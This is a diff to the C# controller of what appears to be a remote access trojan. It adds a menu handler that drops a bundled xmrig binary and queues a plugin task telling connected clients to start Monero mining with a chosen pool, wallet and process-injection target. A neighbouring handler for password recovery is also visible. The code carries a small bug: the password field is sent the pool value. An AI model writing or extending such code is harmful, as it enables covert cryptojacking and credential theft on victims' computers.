@@ -1276,6 +1276,7 @@ namespace Server
             }
         }
         #endregion
+
         #endregion
 
         #region Logs
@@ -1385,6 +1386,71 @@ namespace Server
             }
             catch { }
         }
+
+        private void MinerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView4.Items.Count > 0)
+                {
+                    foreach (ListViewItem item in listView4.Items)
+                    {
+                        if (item.Text == "Miner XMR")
+                        {
+                            return;
+                        }
+                    }
+                }
+
+                using (FormMiner form = new FormMiner())
+                {
+                    if (form.ShowDialog() == DialogResult.OK)
+                    {
+                        if (!File.Exists(@"Plugins\xmrig.bin"))
+                        {
+                            File.WriteAllBytes(@"Plugins\xmrig.bin", Properties.Resources.xmrig);
+                        }
+                        MsgPack packet = new MsgPack();
+                        packet.ForcePathObject("Packet").AsString = "xmr";
+                        packet.ForcePathObject("Command").AsString = "run";
+                        XmrSettings.Pool = form.txtPool.Text;
+                        packet.ForcePathObject("Pool").AsString = form.txtPool.Text;
+
+                        XmrSettings.Wallet = form.txtWallet.Text;
+                        packet.ForcePathObject("Wallet").AsString = form.txtWallet.Text;
+
+                        XmrSettings.Pass = form.txtPass.Text;
+                        packet.ForcePathObject("Pass").AsString = form.txtPool.Text;
+
+                        XmrSettings.InjectTo = form.comboInjection.Text;
+                        packet.ForcePathObject("InjectTo").AsString = form.comboInjection.Text;
+
+                        XmrSettings.Hash = GetHash.GetChecksum(@"Plugins\xmrig.bin");
+                        packet.ForcePathObject("Hash").AsString = XmrSettings.Hash;
+
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "plugin";
+                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
+                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                        ListViewItem lv = new ListViewItem();
+                        lv.Text = "Miner XMR";
+                        lv.SubItems.Add("0");
+                        lv.ToolTipText = Guid.NewGuid().ToString();
+                        listView4.Items.Add(lv);
+                        listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                        getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
         private void PASSWORDRECOVERYToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
